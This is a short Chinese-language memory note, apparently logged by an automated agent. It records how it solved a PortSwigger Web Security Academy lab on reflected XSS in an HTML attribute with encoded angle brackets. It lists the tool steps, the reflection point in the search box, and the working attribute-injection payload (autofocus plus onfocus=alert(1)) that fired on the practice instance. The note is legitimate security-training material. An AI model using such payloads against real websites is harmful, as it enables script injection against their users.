---
metadata:
  node_type: memory
name: "PRS arm A lab-attribute-angle-brackets-html-encoded"
description: "arm A 基线:lab-attribute-angle-brackets-html-encoded 冷实例一次通过 - 搜索框 value 双引号属性注入 \" autofocus onfocus=alert(1) x=\",page_alert fired=true,banner solved"
last_updated: 2026-10-08T23:05:41+08:00
created: 2026-10-08T23:05:41+08:00
---

arm A 基线,冷实例(reused:false)一次通过。

路径与起实例
- canonical 页 = /web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded;
  page_read 直接给 widget-lab-id 8DB2D4D5D579849CA64098E4415C35888C0AF17E8F9B0849462456D7B14B8087。
- range_launch 首次 transport error(status line 读超时),原样重试即成功;实例 https://0ac8000604abeb8a802103a000200044.web-security-academy.net/。

反射点
- GET /?search=X 在结果页 H1 与搜索框双双反射:
  <input type=text placeholder='Search the blog...' name=search value="X">
- 落点是双引号属性值内部;角括号被 HTML 编码,双引号未被编码 ⇒ 属性注入腿成立。
- H1 处 <h1>0 search results for 'X'</h1> 是纯文本,不影响。

载荷与判据
- " autofocus onfocus=alert(1) x="  (URL 编码 %22%20autofocus%20onfocus%3Dalert(1)%20x%3D%22)
- page_alert --settle-ms 2500 → fired=true, alerts=["alert:1"], ready_state=complete。
- banner_verdict → solved=true, congrats_line "<h4>Congratulations, you solved the lab!</h4>"。

用件
page_read → range_launch → http_session(定位反射上下文) → page_alert(判定) → banner_verdict(收口);无新件需求。

坑
- range_launch 的 PortSwigger 侧 TLS/状态行抖动属已知瞬时,重试即可。
- 本 lab 触发是 autofocus+onfocus,无需 driver/keys;页面加载即自触发。

